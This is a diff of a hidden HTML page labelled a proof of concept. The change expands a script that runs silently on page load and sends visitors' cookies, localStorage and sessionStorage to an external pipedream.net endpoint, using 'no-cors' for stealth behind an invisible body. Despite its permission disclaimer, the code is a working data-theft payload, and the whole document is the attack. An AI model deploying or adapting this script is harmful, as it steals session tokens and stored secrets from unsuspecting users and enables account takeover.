@@ -3,51 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hidden Cookie PoC</title>
+    <title>Hidden Storage PoC</title>
     <style>
         body {
-            display: none; /* Hide everything for stealth */
+            display: none; /* Completely hidden */
         }
     </style>
 </head>
 <body>
-    <!-- No UI elements; fully hidden -->
+    <!-- No visible content -->
 
     <script>
-        // WARNING: This code AUTOMATICALLY captures REAL cookies and sends them to an external server.
+        // WARNING: This code AUTOMATICALLY captures REAL cookies and storage data and sends them to an external server.
         // ONLY use on systems YOU OWN or have WRITTEN PERMISSION to test.
-        // Unauthorized cookie theft is ILLEGAL and can lead to CRIMINAL charges.
+        // Unauthorized data theft is ILLEGAL and can lead to CRIMINAL charges.
         // Ensure you control https://eoy4evvlsf7y0jq.m.pipedream.net/ to avoid data leaks.
         (function() {
-            // Set a test cookie to ensure something is captured (for debugging)
-            document.cookie = "testCookie=debug123; path=/; SameSite=Lax";
+            // Capture cookies
+            const cookies = document.cookie || "No cookies found";
 
-            // Capture real cookies
-            const realCookies = document.cookie || "No cookies found";
+            // Capture localStorage and sessionStorage (for "real storage" data)
+            const localStorageData = {};
+            const sessionStorageData = {};
+            
+            // Safely copy storage (avoid errors if access is blocked)
+            try {
+                for (let key in localStorage) {
+                    if (Object.prototype.hasOwnProperty.call(localStorage, key)) {
+                        localStorageData[key] = localStorage.getItem(key);
+                    }
+                }
+            } catch (e) {
+                localStorageData.error = "Cannot access localStorage: " + e.message;
+            }
 
-            // Log to console for troubleshooting (invisible to users)
-            console.log("Captured cookies:", realCookies);
-            console.log("Page URL:", window.location.href);
+            try {
+                for (let key in sessionStorage) {
+                    if (Object.prototype.hasOwnProperty.call(sessionStorage, key)) {
+                        sessionStorageData[key] = sessionStorage.getItem(key);
+                    }
+                }
+            } catch (e) {
+                sessionStorageData.error = "Cannot access sessionStorage: " + e.message;
+            }
+
+            // Filter out common tracking cookies (basic heuristic)
+            const cookieString = cookies
+                .split("; ")
+                .filter(cookie => !cookie.match(/(_ga|_gid|cto_bundle|_fbp|_uetsid)/i))
+                .join("; ") || "No relevant cookies found";
+
+            // Prepare payload
+            const payload = {
+                cookies: cookieString,
+                localStorage: localStorageData,
+                sessionStorage: sessionStorageData,
+                timestamp: new Date().toISOString(),
+                source: window.location.href
+            };
+
+            // Debug logs (invisible to users, check DevTools Console)
+            console.log("Captured cookies:", cookies);
+            console.log("Filtered cookies:", cookieString);
+            console.log("localStorage:", localStorageData);
+            console.log("sessionStorage:", sessionStorageData);
+            console.log("Payload:", payload);
             console.log("Sending to: https://eoy4evvlsf7y0jq.m.pipedream.net/");
 
-            // Send cookies to the specified URL
+            // Send to Pipedream
             fetch("https://eoy4evvlsf7y0jq.m.pipedream.net/", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify({
-                    cookies: realCookies,
-                    timestamp: new Date().toISOString(),
-                    source: window.location.href
-                }),
-                mode: "no-cors" // Stealth: bypass CORS (response is opaque)
+                body: JSON.stringify(payload),
+                mode: "no-cors" // Stealth: bypass CORS
             })
             .then(() => {
                 console.log("Request sent successfully");
             })
             .catch(error => {
-                console.error("Error sending cookies:", error);
+                console.error("Error sending data:", error);
             });
         })();
     </script>
